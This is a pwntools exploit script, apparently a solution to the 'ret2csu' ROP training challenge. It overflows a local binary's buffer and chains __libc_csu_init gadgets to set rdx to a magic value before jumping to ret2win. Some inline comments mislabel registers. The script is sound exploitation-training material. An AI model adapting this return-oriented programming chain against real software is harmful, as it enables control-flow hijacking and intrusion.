#!/usr/bin/python3

from pwn import *

ret2win =0x00000000004007b1
rdx_val = 0xdeadcafebabebeef
pop_rbx = 0x000000000040089a
mov_rdx_r15 = 0x0000000000400880
dynamic = 0x600e48

def exploit():
    p = process("./ret2csu")
    pause()

    p.recvrepeat(0.2)

    log.info("sending buffer overflow")

    rop = p64(pop_rbx) # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
    rop += p64(0x0) # rbp=0x0
    rop += p64(1)  # so rbp won't equal rbx (cmp rbp, rbx must be false)
    rop += p64(dynamic) # r12
    rop += p64(0) # r13
    rop += p64(0) # r14
    rop += p64(rdx_val) # r15 - our desired rbp value!
    rop += p64(mov_rdx_r15)  # popping everything again - mov rdx, r15; mov rsi, r14; mov rdi, r13d; call [r12+rbx*8]; add rbx, 0x1; cmp rbp, rbx; jne 400880; add rsp, 0x8;
    rop += p64(0)  # because of add rsp,0x8 padding - this is a dummy
    rop += p64(1)  # rbx
    rop += p64(0)  # rbp
    rop += p64(0)  # r12
    rop += p64(0)  # r13
    rop += p64(0)  # r14
    rop += p64(0)  # r15
    rop += p64(ret2win)

    p.sendline(b"A" * 40 + rop)

    log.success(p.recvall())


if __name__ == "__main__":
    exploit()


